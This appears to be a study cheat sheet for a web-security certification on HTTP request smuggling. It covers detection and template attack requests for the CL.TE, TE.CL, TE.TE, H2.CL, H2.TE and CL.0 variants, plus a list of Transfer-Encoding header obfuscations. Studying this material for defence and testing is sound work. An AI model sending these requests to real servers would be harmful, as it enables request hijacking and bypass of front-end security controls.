# HTTP Request Smuggling

## Types:

1. HTTP/1.1
    1. CL.TE
    2. TE.CL
    3. TE.TE
2. HTTP/2
   1. H2.CL
   2. H2.TE
3. Browser
   1. CL.0

---

## How to find each type:

1. HTTP/1.1
    1. CL.TE
       - [Using 404 response](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/training/http_req_smuggling_practice.md#confirming-clte-using-404)
    2. TE.CL
       - [Using 404 response](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/training/http_req_smuggling_practice.md#confirming-tecl-using-404)
    3. TE.TE
       - [Using invalid method GPOST](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/training/http_req_smuggling_practice.md#obfuscating-te)
2. HTTP/2
   1. H2.CL
    - Add `Content-Length: 0` to the request
   2. H2.TE
    - Add `Transfer Encoding: Chunked` to the request
    - Then add a 0 before the second request
3. Browser
   1. CL.0
   - When performing the attack, if the response to the follow-up request is normal, then the endpoint is not vulnerable

 ---

## How to exploit each type:

1. HTTP/1.1
    1. CL.TE
       ```
       POST / HTTP/1.1
       Host: vulnerable-website.com
       Content-Length: 13               --> Content length is 13 which includes smuggled
       Transfer-Encoding: chunked    

       0  --> Since it is chunked the 0 terminates the first request, sending smuggled to the backend

       SMUGGLED               
       ```
    2. TE.CL
         ```
       POST / HTTP/1.1
       Host: vulnerable-website.com
       Content-Length: 3               --> Content length is 3 which includes the 8
       Transfer-Encoding: chunked    

       8  --> This is the length of the following request
       SMUGGLED
       0   --> Needs to end in /r/n/r/n
       ```
    3. TE.TE
       - You need to obfuscate the Transfer-Encoding header so that one server does not process it
        ```
        Transfer-Encoding: xchunked
        Transfer-Encoding : chunked
        Transfer-Encoding: chunked
        Transfer-Encoding: x
        Transfer-Encoding:[tab]chunked
        [space]Transfer-Encoding: chunked
        X: X[\n]Transfer-Encoding: chunked
        Transfer-Encoding
        : chunked
2. HTTP/2
   1. H2.CL
    ```
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 0               --> Which tells the backend that smuggled is a second request

   SMUGGLED               
   ```
   2. H2.TE
      ```
       POST / HTTP/1.1
       Host: vulnerable-website.com
       Content-Type: application/x-www-form-urlencoded
       Transfer-Encoding: chunked    
    
       0  --> Since it is chunked the 0 terminates the first request, sending smuggled to the backend
    
       SMUGGLED               
       ```
3. Browser
   1. CL.0
   - Create one tab containing the setup request and another containing an arbitrary follow-up request.
   - Add the two tabs to a group in the correct order.
   - Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).
   - Change the Connection header to keep-alive.
   - Send the sequence and check the responses.

---

## Other important notes:
- HTTP/1.1 allows for content-length transfer-encoding
- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.
- HTTP/2 is only vulnerable if the backend supports HTTP/1.1
    - For HTTP/2 attacks the smuggled request must be HTTP/1.1
- You need to manually switch the protocol in repeater
- [Hidden HTTP/2 support](https://portswigger.net/web-security/request-smuggling/advanced)
